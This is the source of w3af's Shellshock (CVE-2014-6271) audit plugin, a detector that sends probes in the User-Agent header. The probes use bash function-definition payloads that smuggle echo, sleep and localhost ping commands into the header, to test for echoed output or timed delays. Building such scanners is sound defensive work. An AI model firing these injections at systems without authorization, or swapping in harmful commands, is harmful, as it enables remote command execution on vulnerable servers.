"""
shell_shock.py

Copyright 2014 Andres Riancho

This file is part of w3af, http://w3af.org/ .

w3af is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation version 2 of the License.

w3af is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with w3af; if not, write to the Free Software
Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA

"""
from __future__ import with_statement

import w3af.core.data.constants.severity as severity

from w3af.core.controllers.plugins.audit_plugin import AuditPlugin
from w3af.core.controllers.delay_detection.exact_delay_controller import ExactDelayController
from w3af.core.controllers.delay_detection.exact_delay import ExactDelay
from w3af.plugins.audit.os_commanding import Command
from w3af.core.data.fuzzer.mutants.headers_mutant import HeadersMutant
from w3af.core.data.kb.vuln import Vuln
from w3af.core.data.bloomfilter.scalable_bloom import ScalableBloomFilter


TEST_HEADER = 'User-Agent'


class PingDelay(Command, ExactDelay):
    def __init__(self, delay_fmt):
        Command.__init__(self, delay_fmt, 'unix', '')
        ExactDelay.__init__(self, delay_fmt)
        self._delay_delta = 1


class SleepDelay(Command, ExactDelay):
    def __init__(self, delay_fmt):
        Command.__init__(self, delay_fmt, 'unix', '')
        ExactDelay.__init__(self, delay_fmt)


class shell_shock(AuditPlugin):
    """
    Find shell shock vulnerabilities.
    :author: Andres Riancho (andres.riancho@gmail.com)
    """
    DELAY_TESTS = [PingDelay('() { test; }; ping -c %s 127.0.0.1'),
                   ExactDelay('() { test; }; sleep %s')]

    def __init__(self):
        super(shell_shock, self).__init__()
        self.already_tested_urls = ScalableBloomFilter()

    def audit(self, freq, orig_response, debugging_id):
        """
        Tests an URL for shell shock vulnerabilities.

        :param freq: A FuzzableRequest
        :param orig_response: The HTTP response associated with the fuzzable request
        :param debugging_id: A unique identifier for this call to audit()
        """
        url = freq.get_url()

        # Here the script is vulnerable, not a specific parameter, so we
        # run unique tests per URL
        if url not in self.already_tested_urls:
            self.already_tested_urls.add(url)

            # We are implementing these methods for detecting shell-shock vulns
            # if you know about other methods, or have improvements on these
            # please let us know. Pull-requests are also welcome.
            for detection_method in [self._with_header_echo_injection,
                                     #self._with_body_echo_injection,
                                     self._with_time_delay]:
                if detection_method(freq, debugging_id):
                    break

    def _with_header_echo_injection(self, freq, debugging_id):
        """
        We're sending a payload that will trigger the injection of various
        headers in the HTTP response body.

        :param freq: A FuzzableRequest
        :return: True if a vulnerability was found
        """
        injected_header = 'shellshock'
        injected_value = 'check'
        payload = '() { :;}; echo "%s: %s"' % (injected_header, injected_value)

        mutant = self.create_mutant(freq, TEST_HEADER)
        mutant.set_token_value(payload)

        response = self._uri_opener.send_mutant(mutant, debugging_id=debugging_id)
        header_value, header_name = response.get_headers().iget(injected_header)

        if header_value is not None and injected_value in header_value.lower():
            desc = u'Shell shock was found at: %s' % mutant.found_at()

            v = Vuln.from_mutant(u'Shell shock vulnerability', desc,
                                 severity.HIGH, [response.id],
                                 self.get_name(), mutant)

            self.kb_append_uniq(self, 'shell_shock', v)
            return True

    def _with_body_echo_injection(self, freq, debugging_id):
        """
        We're sending a payload that will trigger the injection of new lines
        that will make the response transition from "headers" to "body".

        :param freq: A FuzzableRequest
        :return: True if a vulnerability was found
        """
        raise NotImplementedError

    def create_mutant(self, freq, header_name):
        headers = freq.get_headers()
        headers[header_name] = ''
        freq.set_headers(headers)

        fuzzer_config = {'fuzzable_headers': [TEST_HEADER]}

        mutant = HeadersMutant.create_mutants(freq, [''], [TEST_HEADER],
                                              False, fuzzer_config)[0]

        return mutant

    def _with_time_delay(self, freq, debugging_id):
        """
        Tests an URLs for shell shock vulnerabilities using time delays.

        :param freq: A FuzzableRequest
        :return: True if a vulnerability was found
        """
        self._send_mutants_in_threads(func=self._find_delay_in_mutant,
                                      iterable=self._generate_delay_tests(freq, debugging_id),
                                      callback=lambda x, y: None)

    def _generate_delay_tests(self, freq, debugging_id):
        for delay_obj in self.DELAY_TESTS:
            mutant = self.create_mutant(freq, TEST_HEADER)
            yield mutant, delay_obj, debugging_id

    def _find_delay_in_mutant(self, (mutant, delay_obj, debugging_id)):
        """
        Try to delay the response and save a vulnerability if successful

        :param mutant: The mutant to modify and test
        :param delay_obj: The delay to use
        :param debugging_id: The debugging ID for logging
        """
        ed = ExactDelayController(mutant, delay_obj, self._uri_opener)
        ed.set_debugging_id(debugging_id)
        success, responses = ed.delay_is_controlled()

        if not success:
            return False

        mutant.set_token_value(delay_obj.get_string_for_delay(3))
        desc = u'Shell shock was found at: %s' % mutant.found_at()

        v = Vuln.from_mutant(u'Shell shock vulnerability', desc,
                             severity.HIGH, [r.id for r in responses],
                             self.get_name(), mutant)

        self.kb_append_uniq(self, 'shell_shock', v)
        return True

    def get_long_desc(self):
        """
        :return: A DETAILED description of the plugin functions and features.
        """
        return """
        This plugin detects shell shock vulnerabilities.

        See: CVE-2014-6271
        """